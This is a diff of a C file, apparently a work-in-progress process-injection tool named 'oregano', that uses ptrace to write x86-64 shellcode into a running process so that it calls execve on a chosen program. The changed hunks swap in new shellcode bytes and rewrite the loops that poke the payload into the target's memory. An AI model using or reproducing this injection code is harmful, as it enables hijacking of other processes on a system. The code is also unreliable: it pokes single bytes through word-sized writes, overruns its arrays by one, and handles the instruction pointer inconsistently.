@@ -1,11 +1,11 @@
 // oregano.c
 // https://github.com/R-Rothrock/oregano
 
-//#include<stdio.h> // to be commented out on commit
+#include<stdio.h> // to be commented out on commit
 
 #define _GNU_SOURCE
 
-static char process_pathname[] = "./test.out";
+static char pathname[] = "./test.out";
 
 #include<stdlib.h>
 #include<sys/ptrace.h> /* ptrace() */
@@ -19,12 +19,10 @@ static char process_pathname[] = "./test.out";
   #define IP_REG RIP
   #define PTR_T u_int64_t
 
-  static u_int8_t shellcode1[] = {0x00, 0x48, 0xb8};
+  static u_int8_t shellcode1[] = {0xb8, 0x3b, 0x00, 0x00, 0x00, 0x48, 0xbf};
   static u_int8_t shellcode2[] = {
-    0x99, 0x50, 0x54, 0x5f, 0x52,
-    0x5e, 0x6a, 0x3b, 0x58, 0x0f,
-    0x05, 0x48, 0x31, 0xff, 0x6a,
-    0x3c, 0x58, 0x0f, 0x05
+    0x48, 0x31, 0xf6, 0x48, 0x31,
+    0xd2, 0x0f, 0x05, 0xcc
   };
 
 //#elif defined(__i836) // amd32
@@ -88,41 +86,34 @@ int main(int argc, char *argv[])
 
   PTR_T ip = get_ip_reg(pid);
 
-  //perror("Status"); // to be commented out on commit
+  // storing `pathname`
 
-  for(int i = 0; i < sizeof(shellcode1); i++)
+  ip += sizeof(pathname)/sizeof(char);
+
+  PTR_T pathname_addr = ip;
+  for(int i = sizeof(pathname)/sizeof(char); i >= 0; i--)
+  {
+    ptrace(PTRACE_POKETEXT, pid, ip, pathname[i]);
+    ip--;
+  }
+
+  for(int i = sizeof(shellcode1); i >= 0; i--)
   {
     ptrace(PTRACE_POKETEXT, pid, ip, shellcode1[i]);
-    ip++;
-
-    //perror("Status"); // to be commented out on commit
+    ip--;
   }
 
-  //perror("Status"); // to be commented out on commit
+  ptrace(PTRACE_POKETEXT, pid, ip, pathname_addr);
 
-  for(int i = 0; i < sizeof(process_pathname); i++)
-  {
-    ptrace(PTRACE_POKETEXT, pid, ip, process_pathname[i]);
-    ip++;
-  }
-
-  //perror("Status"); // to be commented out on commit
-
-  for(int i = 0; i < sizeof(shellcode2); i++)
+  for(int i = sizeof(shellcode2); i >= 0; i--)
   {
     ptrace(PTRACE_POKETEXT, pid, ip, shellcode2[i]);
-    ip++;
+    ip--;
   }
 
-  //perror("Status"); // to be commented out on commit
+  ptrace(PTRACE_CONT, pid, 0, 0);
 
-  #if defined(x86_64) || defined(i836)
-    ptrace(PTRACE_POKEUSER, pid, sizeof(long) * IP_REG, ip);
-  #endif
-
-  ptrace(PTRACE_CONT, pid, 18, 0);
-
-  //perror("Status"); // to be commented out on commit
+  perror("Status"); // to be commented out on commit
 
   return 0;
 }
